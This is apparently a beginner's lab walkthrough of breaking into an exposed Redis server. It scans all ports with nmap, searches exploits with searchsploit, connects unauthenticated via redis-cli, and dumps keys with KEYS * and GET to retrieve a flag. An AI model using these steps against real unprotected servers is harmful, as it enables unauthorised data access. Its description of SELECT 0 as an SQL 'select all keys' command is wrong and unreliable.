##### Hack Redis server
First is information gathering 
we use 

sudo nmap -p- --min-rate 5000 10.129.24.31 

 To perform a port scan using Nmap on all ports with the --min-rate option, you can use the following example:
nmap -p- --min-rate 5000 <target_ip>
Replace <target_ip> with the IP address you want to scan. This command scans all ports (-p- option) with a minimum rate of 5000 packets per second (--min-rate 5000). The --min-rate option helps to speed up the scan by setting the minimum number of packets sent per second.

sudo nmap -p- --min-rate 5000 10.129.24.31 




from there after getting the  open port and and its service i now use the searchsploit to get more result it is also advisable to explore various command that that service use in my case service is redis 

searchsploit redis     ---this will give more exploits that are available 



after a research i got that you use the command utility of redis to join to redis server

and its command is 

redis-cli -h 10.129.24.31   - h specifies the hostname redis-cli is command to enter shell of redis server and then ip of target machine 
 
 after you are connecte you get various processes and you can use various command to get the information you like 
 
 eg INFO --- i used it to get varous information in server 
 














this is showing the keyspace available in database 
but i used sql command to check for keyspace   

SELECT 0  -----it means select all keys from index 0 

DBSIZE  -----the size of database

TO check all the keys i used 

KEYS * ---Means select all keys and it responded


the available keys are temp,flag,stor,numb    

then you use the command get to read the keys 

GET temp  
GET flag 
GET stor 
GET numb

AND I GOT ALL THE KEYS
